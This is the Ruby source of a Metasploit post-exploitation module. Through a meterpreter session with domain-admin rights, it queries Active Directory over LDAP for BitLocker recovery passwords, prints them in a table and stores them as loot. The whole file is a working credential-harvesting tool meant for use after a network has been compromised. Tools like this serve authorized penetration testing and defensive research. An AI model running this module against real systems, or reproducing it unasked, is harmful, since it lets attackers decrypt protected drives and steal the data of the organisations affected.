##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::LDAP

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Windows Gather Active Directory BitLocker Recovery',
      'Description'  => %q{
        This module will enumerate BitLocker recovery passwords in the default AD
        directory. This module does require Domain Admin or other delegated privileges.
      },
      'License'      => MSF_LICENSE,
      'Author'       => ['Ben Campbell <ben.campbell[at]mwrinfosecurity.com>'],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter'],
      'References'   =>
        [
          ['URL', 'https://technet.microsoft.com/en-us/library/cc771778%28v=ws.10%29.aspx']
        ]
    ))

    register_options([
      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', true]),
      OptString.new('FIELDS', [true, 'FIELDS to retrieve.', 'distinguishedName,msFVE-RecoveryPassword']),
      OptString.new('FILTER', [true, 'Search filter.', '(objectClass=msFVE-RecoveryInformation)'])
    ])
  end

  def run
    fields = datastore['FIELDS'].gsub(/\s+/, "").split(',')
    search_filter = datastore['FILTER']
    max_search = datastore['MAX_SEARCH']

    begin
      q = query(search_filter, max_search, fields)
    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e
      print_error(e.message)
      return
    end

    if q.nil? || q[:results].empty?
      print_status('No results found...')
      return
    end

    # Results table holds raw string data
    results_table = Rex::Text::Table.new(
      'Header'     => 'BitLocker Recovery Passwords',
      'Indent'     => 1,
      'SortIndex'  => -1,
      'Columns'    => fields
    )

    q[:results].each do |result|
      row = []

      result.each do |field|
        field_value = (field.nil? ? '' : field[:value])
        row << field_value
      end

      results_table << row
    end

    print_line results_table.to_s

    if datastore['STORE_LOOT']
      stored_path = store_loot('bitlocker.recovery', 'text/plain', session, results_table.to_csv)
      print_good("Results saved to: #{stored_path}")
    end
  end
end
